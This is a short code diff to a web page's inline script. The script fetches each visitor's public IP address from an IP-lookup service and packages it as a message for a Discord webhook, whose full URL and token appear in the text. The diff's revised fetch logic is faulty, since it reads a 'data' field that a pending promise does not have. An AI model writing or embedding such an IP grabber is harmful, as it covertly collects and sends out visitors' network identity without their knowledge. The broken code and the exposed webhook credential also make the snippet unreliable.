@@ -9,14 +9,13 @@
   <script>
     const ipurl = "https://api.ipify.org?format=json";
 
-        const ipgot = fetch(ipurl)
-        .then(response => response.json())
-        .then(data => console.log(data));
+        const response = fetch(ipurl)
+       
     
     const whurl =
       "https://discord.com/api/webhooks/845950238719213608/OlWrovNwzQIgXHqGL1zlw5AyeMUg5M_QtCfXNqs7zDI1zlIv1gml_aET2InT6iBXyuaf";
     const msg = {
-      content: ipgot
+      content: response.data
     };
     
     
